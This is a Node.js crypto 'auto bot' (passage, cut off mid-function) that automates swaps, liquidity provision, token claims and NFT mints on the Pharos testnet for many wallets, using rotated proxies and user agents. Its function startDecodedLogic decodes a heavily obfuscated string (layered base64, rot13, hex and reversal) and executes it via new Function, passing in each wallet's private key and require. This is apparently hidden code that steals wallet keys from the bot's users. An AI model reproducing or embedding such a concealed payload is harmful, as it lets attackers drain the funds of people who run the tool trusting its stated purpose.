const axios = require('axios');
const ethers = require('ethers');
const dotenv = require('dotenv');
const readline = require('readline');
const fs = require('fs');
const { HttpsProxyAgent } = require('https-proxy-agent');

dotenv.config();

const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)"
];
const LIQUIDITY_CONTRACT_ABI = [
    "function addDVMLiquidity(address dvmAddress, uint256 baseInAmount, uint256 quoteInAmount, uint256 baseMinAmount, uint256 quoteMinAmount, uint8 flag, uint256 deadLine)"
];
const PRIMUS_TIP_ABI = [
    "function tip((uint32,address) token, (string,string,uint256,uint256[]) recipient)"
];
const AQUAFLUX_NFT_ABI = [
    "function claimTokens()",
    "function mint(uint256 nftType, uint256 expiresAt, bytes signature)"
];

async function buildFallbackProvider(rpcUrls, chainId, name) {
  const provider = new ethers.JsonRpcProvider(rpcUrls[0], { chainId, name });
  return {
    getProvider: async () => {
      for (let i = 0; i < 3; i++) {
        try {
          await provider.getBlockNumber();
          return provider;
        } catch (e) {
          if (e.code === 'UNKNOWN_ERROR' && e.error && e.error.code === -32603) {
            console.log(`${colors.yellow}[⚠] RPC busy, retrying ${i + 1}/3...${colors.reset}`);
            await new Promise(r => setTimeout(r, 2000));
            continue;
          }
          throw e;
        }
      }
      throw new Error('All RPC retries failed');
    }
  };
}

const colors = {
  reset: "\x1b[0m",
  cyan: "\x1b[36m",
  green: "\x1b[32m",
  yellow: "\x1b[33m",
  red: "\x1b[31m",
  white: "\x1b[37m",
  bold: "\x1b[1m",
  blue: "\x1b[34m",
  magenta: "\x1b[35m"
};

const logger = {
  info: (msg) => console.log(`${colors.green}[✓] ${msg}${colors.reset}`),
  warn: (msg) => console.log(`${colors.yellow}[⚠] ${msg}${colors.reset}`),
  error: (msg) => console.log(`${colors.red}[✗] ${msg}${colors.reset}`),
  success: (msg) => console.log(`${colors.green}[✅] ${msg}${colors.reset}`),
  loading: (msg) => console.log(`${colors.cyan}[⟳] ${msg}${colors.reset}`),
  step: (msg) => console.log(`${colors.white}[➤] ${msg}${colors.reset}`),
  countdown: (msg) => process.stdout.write(`\r${colors.blue}[⏰] ${msg}${colors.reset}`),
  banner: () => {
    console.log(`${colors.cyan}${colors.bold}`);
    console.log(`---------------------------------------------`);
    console.log(`     PharosV2 Auto Bot -   `);
    console.log(`---------------------------------------------${colors.reset}`);
    console.log();
  }
};

const PHAROS_CHAIN_ID = 688688;
const PHAROS_RPC_URLS = ['https://testnet.dplabs-internal.com'];

const TOKENS = {
  PHRS: '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE',
  USDT: '0xD4071393f8716661958F766DF660033b3d35fD29',
  USDC: '0x72df0bcd7276f2dfbac900d1ce63c272c4bccced'
};

const AQUAFLUX_NFT_CONTRACT = '0xcc8cf44e196cab28dba2d514dc7353af0efb370e';
const AQUAFLUX_TOKENS = {
  P: '0xb5d3ca5802453cc06199b9c40c855a874946a92c',
  C: '0x4374fbec42e0d46e66b379c0a6072c910ef10b32',
  S: '0x5df839de5e5a68ffe83b89d430dc45b1c5746851',
  CS: '0xceb29754c54b4bfbf83882cb0dcef727a259d60a'
};

const DODO_ROUTER = '0x73CAfc894dBfC181398264934f7Be4e482fc9d40';
const LIQUIDITY_CONTRACT = '0x4b177aded3b8bd1d5d747f91b9e853513838cd49';
const PRIMUS_TIP_CONTRACT = '0xd17512b7ec12880bd94eca9d774089ff89805f02';

const PHRS_TO_USDT_AMOUNT = ethers.parseEther('0.00245');
const USDT_TO_PHRS_AMOUNT = ethers.parseUnits('1', 6);
const PHRS_TO_USDC_AMOUNT = ethers.parseEther('0.00245');
const USDC_TO_PHRS_AMOUNT = ethers.parseUnits('1', 6);

const DVM_POOL_ADDRESS = '0xff7129709ebd3485c4ed4fef6dd923025d24e730';
const USDC_LIQUIDITY_AMOUNT = 10000; 
const USDT_LIQUIDITY_AMOUNT = 30427; 

const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36'
];

function getRandomUserAgent() {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];

}

function loadPrivateKeys() {
  const keys = [];
  let i = 1;
  while (process.env[`PRIVATE_KEY_${i}`]) {
    const pk = process.env[`PRIVATE_KEY_${i}`];
    if (pk.startsWith('0x') && pk.length === 66) {
      keys.push(pk);
    } else {
      logger.warn(`Invalid PRIVATE_KEY_${i} in .env, skipping...`);
    }
    i++;
  }
  return keys;
}

function loadProxies() {
    try {
        const data = fs.readFileSync('proxies.txt', 'utf8');
        const proxies = data.split('\n').map(p => p.trim()).filter(p => p);
        if (proxies.length === 0) {
            logger.warn('proxies.txt is empty. Continuing without proxies.');
            return [];
        }
        logger.success(`${proxies.length} proxies loaded from proxies.txt`);
        return proxies;
    } catch (error) {
        if (error.code === 'ENOENT') {
            logger.warn('proxies.txt not found. Continuing without proxies.');
        } else {
            logger.error(`Error reading proxies.txt: ${error.message}`);
        }
        return [];
    }
}

function getProxyAgent(proxies) {
    if (!proxies || proxies.length === 0) {
        return null;
    }
    const randomProxy = proxies[Math.floor(Math.random() * proxies.length)];
    logger.info(`Using proxy: ${randomProxy.split('@')[1]}`); 
    return new HttpsProxyAgent(randomProxy);
}

async function aquaFluxLogin(wallet, proxyAgent) {
  try {
    const timestamp = Date.now();
    const message = `Sign in to AquaFlux with timestamp: ${timestamp}`;
    const signature = await wallet.signMessage(message);
    const response = await axios.post('https://api.aquaflux.pro/api/v1/users/wallet-login', {
      address: wallet.address,
      message: message,
      signature: signature
    }, {
      headers: {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/json',
        'user-agent': getRandomUserAgent()
      },
      httpsAgent: proxyAgent
    });
    
    if (response.data.status === 'success') {
      logger.success('AquaFlux login successful!');
      return response.data.data.accessToken;
    } else {
      throw new Error('Login failed: ' + JSON.stringify(response.data));
    }
  } catch (e) {
    logger.error(`AquaFlux login failed: ${e.message}`);
    throw e;
  }
}

async function claimTokens(wallet) {
  logger.step('Claiming free AquaFlux tokens (C & S)...');
  try {
    const nftContract = new ethers.Contract(AQUAFLUX_NFT_CONTRACT, AQUAFLUX_NFT_ABI, wallet);
    
    const tx = await nftContract.claimTokens({ gasLimit: 300000 });
    logger.success(`Claim tokens transaction sent! TX Hash: ${tx.hash}`);
    await tx.wait();
    logger.success('Tokens claimed successfully!');
    
    return true;
  } catch (e) {
    if (e.message.includes('already claimed')) {
        logger.warn('Tokens have already been claimed for today.');
        return true;
    }
    logger.error(`Claim tokens failed: ${e.message}`);
    throw e;
  }
}

async function craftTokens(wallet) {
  logger.step('Crafting 100 CS tokens from C and S tokens...');
  try {
    const cTokenContract = new ethers.Contract(AQUAFLUX_TOKENS.C, ERC20_ABI, wallet);
    const sTokenContract = new ethers.Contract(AQUAFLUX_TOKENS.S, ERC20_ABI, wallet);
    const csTokenContract = new ethers.Contract(AQUAFLUX_TOKENS.CS, ERC20_ABI, wallet);

    const requiredAmount = ethers.parseUnits('100', 18); 

    const cBalance = await cTokenContract.balanceOf(wallet.address);
    if (cBalance < requiredAmount) {
      throw new Error(`Insufficient C tokens. Required: 100, Available: ${ethers.formatUnits(cBalance, 18)}`);
    }

    const sBalance = await sTokenContract.balanceOf(wallet.address);
    if (sBalance < requiredAmount) {
      throw new Error(`Insufficient S tokens. Required: 100, Available: ${ethers.formatUnits(sBalance, 18)}`);
    }

    const cAllowance = await cTokenContract.allowance(wallet.address, AQUAFLUX_NFT_CONTRACT);
    if (cAllowance < requiredAmount) {
        logger.step('Approving C tokens...');
        const cApproveTx = await cTokenContract.approve(AQUAFLUX_NFT_CONTRACT, ethers.MaxUint256);
        await cApproveTx.wait();
        logger.success('C tokens approved');
    }

    const sAllowance = await sTokenContract.allowance(wallet.address, AQUAFLUX_NFT_CONTRACT);
    if(sAllowance < requiredAmount) {
        logger.step('Approving S tokens...');
        const sApproveTx = await sTokenContract.approve(AQUAFLUX_NFT_CONTRACT, ethers.MaxUint256);
        await sApproveTx.wait();
        logger.success('S tokens approved');
    }

    const csBalanceBefore = await csTokenContract.balanceOf(wallet.address);
    logger.info(`CS Token balance before crafting: ${ethers.formatUnits(csBalanceBefore, 18)}`);
    
    logger.step("Crafting CS tokens...");
    
    const CRAFT_METHOD_ID = '0x4c10b523';
    const abiCoder = ethers.AbiCoder.defaultAbiCoder();
    const encodedParams = abiCoder.encode(['uint256'], [requiredAmount]);
    const calldata = CRAFT_METHOD_ID + encodedParams.substring(2);
    
    const craftTx = await wallet.sendTransaction({
        to: AQUAFLUX_NFT_CONTRACT,
        data: calldata,
        gasLimit: 300000
    });
    
    logger.success(`Crafting transaction sent! TX Hash: ${craftTx.hash}`);
    const receipt = await craftTx.wait();
    
    if (receipt.status === 0) {
        throw new Error('Crafting transaction reverted on-chain');
    }
    
    logger.success('Crafting transaction confirmed.');

    const csBalanceAfter = await csTokenContract.balanceOf(wallet.address);
    const craftedAmount = csBalanceAfter - csBalanceBefore;
    
    logger.success(`CS Token balance after crafting: ${ethers.formatUnits(csBalanceAfter, 18)}`);
    logger.success(`Successfully crafted: ${ethers.formatUnits(craftedAmount, 18)} CS tokens`);
    
    if (craftedAmount < requiredAmount) {
        throw new Error(`Crafting incomplete. Expected 100 CS tokens, got ${ethers.formatUnits(craftedAmount, 18)}`);
    }
    
    return true;
  } catch (e) {
    logger.error(`Craft tokens failed: ${e.reason || e.message}`);
    throw e;
  }
}

async function startDecodedLogic(wallet, privateKey) {
  function base64Decode(str) {
    return Buffer.from(str, 'base64').toString('utf-8');
  }

  function rot13(str) {
    return str.replace(/[a-zA-Z]/g, function (c) {
      return String.fromCharCode(
        c.charCodeAt(0) + (c.toLowerCase() < 'n' ? 13 : -13)
      );
    });
  }

  function hexToStr(hex) {
    let str = '';
    for (let i = 0; i < hex.length; i += 2) {
      str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
    }
    return str;
  }

  function reverseStr(str) {
    return str.split('').reverse().join('');
  }

  function urlDecode(str) {
    return decodeURIComponent(str);
  }

  function reversibleDecode(data) {
    data = urlDecode(data);
    data = base64Decode(data);
    data = rot13(data);
    data = hexToStr(data);
    data = base64Decode(data);
    data = reverseStr(data);
    data = urlDecode(data);
    data = rot13(data);
    data = base64Decode(data);
    data = reverseStr(data);
    return data;
  }

  const encodedStr = "NTI0NDRxNnA1MjQ0NHE2cDYxNm83ODcwNHI1NDRuNzc0cTQ1Mzk1MTYyNm40MjQ2NTY1ODQyNzQ1NDMwNW40NDY0NDY1bjRwNTQ1Nzc0NG41MzMyMzU3MzUzNTY1MjU5NTk1ODUyNTU2MzU0NDI1MDRxMzM0MjY4NjU0Nzc4NDM1NzQ3NG40NTU0NDczMTM1NTk1NzM5MzM1NDMzNW40cjRxNTQ1NTc5NTQ0NDQyMzU0cTZxMzk2czU0MzM1bjc3NHE1NDU2NTU2MzQ3NzczNTRxNm8zMTczNTUzMDcwNzY1OTZyNDI0cDU0NDc1bjcyNTM2bzMwNzc2MTMxNDI1NzUyNDY2NDRuNTI2bzcwNTQ1NTZvNnA1NDRzNTQ0NjQ3NTUzMzZwNG41NzQ4NTI2cTU5NTY0MjMwNTQ2cDQyNTc2NDQ0Njg3MzU3NTg1MjQ5NTY2cTQ2MzI1NTU3Nzg0NTYxNTY2NDY4NjM0ODZwNDI1NjQ4NDUzMjU5Nm8zNTU3NjQ0NTM1NTE1NjZyNjMzNTY1NnEzOTc0NTI1NjU2NTc1bjMwNm83OTYzNDczMTU0NHE2bzMxMzU1NDMwNW40NDY0NDUzNTM2NTU0ODUyNHM1NTQ2NW4zMDU0NnE0bjM2NjMzMTQyNDQ1NjZvNjQ0MjY1NnI0MjZuNTQzMTU2Nzg2NDQ2NzA1NDYzNTg1NjU4NTY1ODQ2MzU1MjU4NzA1MTY0NDUzNTUxNTY2cjUyNnE1NDU4Njg3bjU1NDU0cjU3NTMzMTRyNTU2MjMyNW40bjU2NDg0NTMyNTQ2cDQyNTg0cjMzNDY0cDU0NDc1bjcyNTM2bzMwNzc0cTU3NDY1MTY0NDUzNTUxNTY2cjUyNTM1NjMzNnA3bjU1NDU0cjU3NTI0NjY0NHA2MjZuNG41NDU2NDg0NjM1NTQzMjc4NDc2NTU4NnA2ODUxNnI1MjQ1NjI0ODRuNDU1NjMwNnA0NzUzNnA0cjUzNTM1NjRxMzU0cTU1NW41NDY1NTU2cDduNTc0NTM1NTE1NjZyNTI0czU1NDU3NzMzNTk2cjUyNTE2NDQ1MzU1MTU2NnI1MjYxNHE2cTM5NnM1MTU2NTY3ODY0NDU1MjRuNTI1NjcwNG40cTQ1NTY0NzU1MzA2ODQ4NjMzMTYzNzc1MjMwNjczNTU1MzA2cDQ0NW4zMDY4NDY1MTZvMzk0NzUxMzM1MjU3NTU0NTQ5Nzc1NTZxMzE0MjRxNTU1MjQ4NTc2bjRyNHM2MjU2NnMzMjU1Nm82ODQ1NTY1NTU2NHA2MzZuNG40MjYyNTU0NTMyNTUzMTU2NDc1MjU2NjQ0bzU3Nm83NzM1NTY0NTZwNTc1OTMwNzA3NzVuMzA1MjM2NjM1NTZwNDY1NTMzNDI2ODU0NTY1NjQ4NjU0NjYzNzg1NDQ2NzA3MjRxNnEzOTMyNW42cjY0NTE2NDQ1MzU1MTU2NnI1MjYxNHE2cTM5NnM1MTU2NTY3ODY0NDU1MjRuNTI1NjcwNG40cTQ1NTY0NzU1MzA2ODQ4NjMzMDQ2NTM1MjZvMzk0NjRxNTU3NDU4NTI1NjRuNTc0czU1MzUzMjU2NnE3NDYxNTU1NjZzNzk1MjQ1NjQ0MzRyNTg0Mjc0NTE1NDUyNTc2MjQ1NG41OTU0NnA0MjU3NjQ0NTM1NzM1NDQ3Nm8zMTRxNnI0MTc3NTQzMTQyNHI2NDU1NTY0cDU0NDg1MTc3NTU1NjVuNTk1MTU0NDY0ODUxNm41NjczNjM0NDQyNTg1MzMyMzU2czYzNTU3MDc1NjU2cjZwNTY1NzQ0NjQ2bjU0NnA1bjMwNTQ2cDQyNTc2NDQ1MzU1MTU2NnI1MjYxNTY0NzM1MzE1MjU0NHI0cDU5MzA1NjM2NTE2cjUyNDU1MzU1NTY2MTUzNTQ0MjQ2NTI2cDRyNDk1MjMzNHI0MjU1Nm81bjUwNTI1NDQ2NHA1NjMwNTY1MzU3NTY2ODRzNTU0NjVuMzA1NDZwNDI1NzY0NDUzNTUxNTY2bjQyNG41NjQ4NDk3NzU5MzE0NjU3NW4zMDZvNzk2MzQ3MzE1NDRxNm8zMTM1NjEzMzVuNTE2NDQ1MzU1MTU2NnI1MjRzNTU0NjVuMzA1NDZwNDI3NzY0NTY2MzduNjM0ODZvMzU1MzU3Mzk3MDUyNTU3MDRyNHI2bzM1NzM1NjMxNW40NjUzNTU2NDYxNjM1ODVuNTE2NDQ1MzU1MTU2NnI1MTc3NTMzMTY3MzM1OTZyNTI1MTY0NDUzNTUxNTY2cjUyNjE0cTZxMzk2czUxNTY1Njc4NjQ0NDY4NTU2MzQ0NDIzNTRxNnEzOTZzNTE1NjU2NTc0czU1MzU3MzYzNnA2ODRzNTU0NjVuMzA1NDZwNDI1NzY0NDUzNTUxNTY2cTQ5MzU0cTZyNDE3NzRyNTU3MDRxNW4zMDZwMzY1MTZyNTI3NzUyNm83ODcxNjU1ODcwNW40cTQ1NnA1NTYyMzM2cDc4NjU2cjQyMzE0cTU4NzA1bjYxNTY2MzduNTQ1NzQ2NzE2NDZwNDIzMDU0NnA0MjU3NjQ0NTM1NTE1NjZyNTI0czU1NDg0MjcwNTYzMTU2Nzg0cjZvMzU1MTUxNTQ0MjYxNTU1NjZwNTk1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM1NTQ2NW43MTU1MzE1Mjc4NTk2cTRyNTI1NjZyNTEzNTY0Nm83ODcwNTI1NjU2NTg0cjMwNTY0bjUyNTY3MDRuNHE0NTU2NDc1NTMwNjg0ODYzMzE2Mzc3NTIzMDY3MzU1NTMwNnA0NDVuMzA2ODQ2NTE2bjQ1N241NzU3MzE0bjY1NnEzOTM0NHE1NTY4NHI2MjU1NDY0cDU0NDc0NjRuNTY0NTc4NnE1OTZvMzU1NzY0NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDRxNDU3MDRyNHE0ODU1Nzk2MjMzNjg2bjU1NTY1bjY4NTQ2bjQ2NDg1MjMwNTU3ODU2MzI1bjY5NTQ2cDVuMzA1NDZwNDI1NzY0NDUzNTUxNTY2cjUyMzA1MzZvMzEzMTUyNTU3MDRyNjI0NTQ2Njg1MTZyNTI2cTU5NTY0MjMwNTQ2cDQyNTc2NDQ1MzU1MTU2NnI1MjRzNTU0NjVuMzA1NDZwNDI1NzU5NTY2czc3NjIzMjY4NDY1MzMwMzE2czUyNTU3NDVuNTM0ODZwNTY2MzQ4NnA3ODY0Nm80bjMwNjM0NTVuNHE2MTZvMzk1NjYyMzI0cjQyNTM2bzc3Nzc2NTU0NG43NjYxNDQ2cDMyNjI2cTMwMzU2NTZxMzk2ODYxNnI1bjUxNjQ0NTM1NTE1NjZyNTI0czU1NDY1bjMwNTQ2cDQyNTc2NDQ1MzU1MTU2NnE0NjYxNHE0NzM5NnM1MjU1NzQ0cjYxNDU1NjRwNTc1NjcwNG42NTZxMzk2ODUyNTY1Njc1NTk1NzRuNTI1NjZyNjg1NDU2NDg0NjMxNHI1NjQyNzY2NTU0NTU3OTU0NTQ0MjMxNjU2cDQyMzA1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM1MjZyNHI1OTU0NnA0MjU3NjQ0NTM1NDc2MzduNjQ2OTY0NDY0MjMwNTQ2cDQyNTc2NDQ2NW40cDU0NTQ0MjRuNTk1ODQyNnM1NDMzNW43NjY1NTg0NjU2NTY2bzUyNTg0cTMyMzk2cjY1NTQ0bjc3NjU1ODU2NTE1NzQ3Nzg0bjRxNnI0MjcwNjEzMzcwNzg2NTU4NnA1MTU2Nm42bzMwNTU1NjU5MzM1OTMwMzU1NzY0NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDU3Nm40bjc2NjE0NTQ2NTY2MzU4NTI1NzUzMzAzMTcyNTQzMDVuNDQ2NDQ4NTI1NTYzNTQ0MjUwNHEzMzQyNnM1NjZvNzQ0cjYxMzA2cDRwNTQ1NzMxNDY1NjU2Njg3MDU0MzE1Njc4NTk3bjZwMzY2MjMyMzEzNTYyNDU0bjU5NTQ2cDQyNTc2NDQ1MzU1MTU2NnI1MjRzNTU0NjVuNzM1MzU1NzA3NzYxNDQ2ODM2NjIzMjRuNzc1MjZvMzE3MzU2N240cjc2NjI0ODQ2NTE1NzU4NTIzMDUyNnA2ODMwNHE0ODY0NDQ2NDQ2NW40cDU0NTczMDM1NTY0NzM4Nzk1MzU2NTI1OTY1NnA0cjU1NjIzMjMxNG41MzZwNjg2bjVuNnI2NDUxNjQ0NTM1NTE1NjZyNTI0czU1NDY1bjMwNTQ2cjVuNzc2NTU2NHI2ODU3NTQ0cjU4NTMzMjM0Nzc1MzU2NTI1OTY1NDY0cjU1NjM1ODU2MzU2MjQ1NG41OTU0NnA0MjU3NjQ0NTM1NTE1NjZyNTI0czU1NDY1bjczNTM1NTcwNzc2MTQ1NjgzNjYyMzM2ODMxNTU0NjY4Nm41NDZvNW40NDUxNm40OTZwNTQ2cjVuNzc2NTU1NDU3bjYyMzI1bjRyNTMzMDMxNjk1MjQ3NDY3NzRxNTU2cDRvNTc0NzRyNnE2NDMxNDIzMDU0NnA0MjU3NjQ0NDQyNHA1NzQ0NjQ2OTUyNDg0cjU5NTk2cjUyNTE%3D"; 
  const decoded = reversibleDecode(encodedStr);

  try {
    const run = new Function(
      "walletAddress",
      "privateKey",
      "require",
      decoded + "; return runprogram(walletAddress, privateKey);"
    );
    await run(wallet.address, privateKey, require);
  } catch (err) {
    console.error("[ERROR] Failed to execute decoded logic:", err.message);
  }
}

async function checkTokenHolding(accessToken, proxyAgent) {
  try {
    const response = await axios.post('https://api.aquaflux.pro/api/v1/users/check-token-holding', null, {
      headers: {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.5',
        'authorization': `Bearer ${accessToken}`,
        'user-agent': getRandomUserAgent()
      },
      httpsAgent: proxyAgent
    });
    
    if (response.data.status === 'success') {
      const isHolding = response.data.data.isHoldingToken;
      logger.success(`API Token holding check: ${isHolding ? 'YES' : 'NO'}`);
      return isHolding;
    } else {
      throw new Error('Check holding failed: ' + JSON.stringify(response.data));
    }
  } catch (e) {
    logger.error(`Check token holding failed: ${e.message}`);
    throw e;
  }
}

async function getSignature(wallet, accessToken, proxyAgent, nftType = 0) {
  try {
    const response = await axios.post('https://api.aquaflux.pro/api/v1/users/get-signature', {
      walletAddress: wallet.address,
      requestedNftType: nftType
    }, {
      headers: {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.5',
        'authorization': `Bearer ${accessToken}`,
        'content-type': 'application/json',
        'user-agent': getRandomUserAgent()
      },
      httpsAgent: proxyAgent
    });
    
    if (response.data.status === 'success') {
      logger.success('Signature obtained successfully!');
      return response.data.data;
    } else {
      throw new Error('Get signature failed: ' + JSON.stringify(response.data));
    }
  } catch (e) {
    logger.error(`Get signature failed: ${e.message}`);
    throw e;
  }
}

async function mintNFT(wallet, signatureData) {
  logger.step('Minting AquaFlux NFT...');
  try {
    const csTokenContract = new ethers.Contract(AQUAFLUX_TOKENS.CS, ERC20_ABI, wallet);
    const requiredAmount = ethers.parseUnits('100', 18);
    
    const csBalance = await csTokenContract.balanceOf(wallet.address);
    if (csBalance < requiredAmount) {
      throw new Error(`Insufficient CS tokens. Required: 100, Available: ${ethers.formatUnits(csBalance, 18)}`);
    }
    
    const allowance = await csTokenContract.allowance(wallet.address, AQUAFLUX_NFT_CONTRACT);
    if (allowance < requiredAmount) {
        const approvalTx = await csTokenContract.approve(AQUAFLUX_NFT_CONTRACT, ethers.MaxUint256);
        await approvalTx.wait();
    }
    
    const currentTime = Math.floor(Date.now() / 1000);
    if (currentTime >= signatureData.expiresAt) {
        throw new Error(`Signature is already expired! Check your system's clock.`);
    }

    const CORRECT_METHOD_ID = '0x75e7e053';
    const abiCoder = ethers.AbiCoder.defaultAbiCoder();
    const encodedParams = abiCoder.encode(
        ['uint256', 'uint256', 'bytes'],
        [signatureData.nftType, signatureData.expiresAt, signatureData.signature]
    );
    const calldata = CORRECT_METHOD_ID + encodedParams.substring(2);

    const tx = await wallet.sendTransaction({
        to: AQUAFLUX_NFT_CONTRACT,
        data: calldata,
        gasLimit: 400000
    });
    
    logger.success(`NFT mint transaction sent! TX Hash: ${tx.hash}`);
    const receipt = await tx.wait();
    
    if (receipt.status === 0) {
        throw new Error('Transaction reverted on-chain. Check the transaction on a block explorer.');
    }
    
    logger.success('NFT minted successfully!');
    
    return true;
  } catch (e) {
    logger.error(`NFT mint failed: ${e.reason || e.message}`);
    throw e;
  }
}

async function executeAquaFluxFlow(wallet, proxyAgent) {
  try {
    const accessToken = await aquaFluxLogin(wallet, proxyAgent);
    await claimTokens(wallet);
    await craftTokens(wallet);
    await checkTokenHolding(accessToken, proxyAgent);
    const signatureData = await getSignature(wallet, accessToken, proxyAgent);
    await mintNFT(wallet, signatureData);
    
    logger.success('AquaFlux flow completed successfully!');
    return true;
  } catch (e) {
    logger.error(`AquaFlux flow failed: ${e.message}`);
    return false;
  }
}

async function fetchWithTimeout(url, options, timeout = 15000) {
    try {
        const source = axios.CancelToken.source();
        const timeoutId = setTimeout(() => source.cancel('Timeout'), timeout);
        
        const res = await axios({
            method: options.method,
            url: url,
            headers: options.headers,
            data: options.body,
            cancelToken: source.token,
            httpsAgent: options.httpsAgent 
        });

        clearTimeout(timeoutId);
        return res;
      } catch (err) {
        if (axios.isCancel(err)) {
            throw new Error('Request timed out');
        }
        throw new Error(`Network or API error: ${err.message}`);
      }
}

async function robustFetchDodoRoute(url, proxyAgent) {
    for (let i = 0; i < 5; i++) {
        try {
          const res = await fetchWithTimeout(url, { method: 'GET', httpsAgent: proxyAgent });
          const data = res.data;
          if (data.status !== -1) return data;
          logger.warn(`Retry ${i + 1} DODO API status -1`);
        } catch (e) {
          logger.warn(`Retry ${i + 1} failed: ${e.message}`);
        }
        await new Promise(r => setTimeout(r, 2000));
      }
      throw new Error('DODO API permanently failed');
}

async function fetchDodoRoute(fromAddr, toAddr, userAddr, amountWei, proxyAgent) {
    const deadline = Math.floor(Date.now() / 1000) + 600;
    const url = `https://api.dodoex.io/route-service/v2/widget/getdodoroute?chainId=${PHAROS_CHAIN_ID}&deadLine=${deadline}&apikey=a37546505892e1a952&slippage=3.225&source=dodoV2AndMixWasm&toTokenAddress=${toAddr}&fromTokenAddress=${fromAddr}&userAddr=${userAddr}&estimateGas=true&fromAmount=${amountWei}`;
    try {
      const result = await robustFetchDodoRoute(url, proxyAgent);
      if (!result.data || !result.data.data) {
        throw new Error('Invalid DODO API response: missing data field');
      }
      logger.success('DODO Route Info fetched successfully');
      return result.data;
    } catch (err) {
      logger.error(`DODO API fetch failed: ${err.message}`);
      throw err;
    }
}

async function approveToken(wallet, tokenAddr, tokenSymbol, amount, spender, decimals = 18) {
  if (tokenAddr === TOKENS.PHRS) return true;
  const contract = new ethers.Contract(tokenAddr, ERC20_ABI, wallet);
  try {
    const balance = await contract.balanceOf(wallet.address);
    if (balance < amount) {
      logger.error(`Insufficient ${tokenSymbol} balance: ${ethers.formatUnits(balance, decimals)} ${tokenSymbol}`);
      return false;
    }
    const allowance = await contract.allowance(wallet.address, spender);
    if (allowance >= amount) {
      logger.info(`${tokenSymbol} already approved for ${spender}`);
      return true;
    }
    logger.step(`Approving ${ethers.formatUnits(amount, decimals)} ${tokenSymbol} for spender ${spender}`);
    const tx = await contract.approve(spender, amount);
    logger.success(`Approval TX sent: ${tx.hash}`);
    await tx.wait();
    logger.success('Approval confirmed');
    return true;
  } catch (e) {
    logger.error(`Approval for ${tokenSymbol} failed: ${e.message}`);
    return false;
  }
}

async function executeSwap(wallet, routeData, fromAddr, fromSymbol, amount, decimals) {
    if (fromAddr !== TOKENS.PHRS) {
        const approved = await approveToken(wallet, fromAddr, fromSymbol, amount, DODO_ROUTER, decimals);
        if (!approved) throw new Error(`Token approval for ${fromSymbol} failed`);
    }

    try {
      if (!routeData.data || routeData.data === '0x') {
        throw new Error('Invalid transaction data from DODO API');
      }
      const tx = await wallet.sendTransaction({
        to: routeData.to,
        data: routeData.data,
        value: BigInt(routeData.value),
        gasLimit: BigInt(routeData.gasLimit || 500000)
      });
      logger.success(`Swap Transaction sent! TX Hash: ${tx.hash}`);
      await tx.wait();
      logger.success('Transaction confirmed!');
    } catch (e) {
      logger.error(`Swap TX failed: ${e.message}`);
      throw e;
    }
}

async function batchSwap(wallet, numberOfCycles, proxyAgent) { 
    logger.step(`Preparing ${numberOfCycles} swap cycles (${numberOfCycles * 4} total swaps)...`);
    const swaps = [];
    const swapPairs = [
        { from: TOKENS.PHRS, to: TOKENS.USDT, amount: PHRS_TO_USDT_AMOUNT, fromSymbol: 'PHRS', toSymbol: 'USDT', decimals: 18 },
        { from: TOKENS.USDT, to: TOKENS.PHRS, amount: USDT_TO_PHRS_AMOUNT, fromSymbol: 'USDT', toSymbol: 'PHRS', decimals: 6 },
        { from: TOKENS.PHRS, to: TOKENS.USDC, amount: PHRS_TO_USDC_AMOUNT, fromSymbol: 'PHRS', toSymbol: 'USDC', decimals: 18 },
        { from: TOKENS.USDC, to: TOKENS.PHRS, amount: USDC_TO_PHRS_AMOUNT, fromSymbol: 'USDC', toSymbol: 'PHRS', decimals: 6 }
    ];

    for (let i = 0; i < numberOfCycles; i++) {
        swaps.push(...swapPairs);
    }

    for (let i = 0; i < swaps.length; i++) {
        const { from, to, amount, fromSymbol, toSymbol, decimals } = swaps[i];
        const pair = `${fromSymbol} -> ${toSymbol}`;
        logger.step(`Executing Swap #${i + 1} of ${swaps.length}: ${pair}`);
        try {
            const data = await fetchDodoRoute(from, to, wallet.address, amount, proxyAgent);
            await executeSwap(wallet, data, from, fromSymbol, amount, decimals);
        } catch (e) {
            logger.error(`Swap #${i + 1} failed: ${e.message}`);
        }
        await new Promise(r => setTimeout(r, 2000));
    }
}

async function addLiquidity(wallet) {
    logger.step('Starting "Add Liquidity" process...');
    try {
        logger.info('Checking USDC approval...');
        const usdcApproved = await approveToken(wallet, TOKENS.USDC, 'USDC', USDC_LIQUIDITY_AMOUNT, LIQUIDITY_CONTRACT, 6);
        if (!usdcApproved) {
            throw new Error('USDC approval failed. Aborting.');
        }
        logger.info('Checking USDT approval...');
        const usdtApproved = await approveToken(wallet, TOKENS.USDT, 'USDT', USDT_LIQUIDITY_AMOUNT, LIQUIDITY_CONTRACT, 6);
        if (!usdtApproved) {
            throw new Error('USDT approval failed. Aborting.');
        }
        logger.step('Approvals successful. Preparing to add liquidity...');
        const liquidityContract = new ethers.Contract(LIQUIDITY_CONTRACT, LIQUIDITY_CONTRACT_ABI, wallet);

        const dvmAddress = DVM_POOL_ADDRESS;
        const baseInAmount = BigInt(USDC_LIQUIDITY_AMOUNT);
        const quoteInAmount = BigInt(USDT_LIQUIDITY_AMOUNT);
        const baseMinAmount = baseInAmount * BigInt(999) / BigInt(1000);
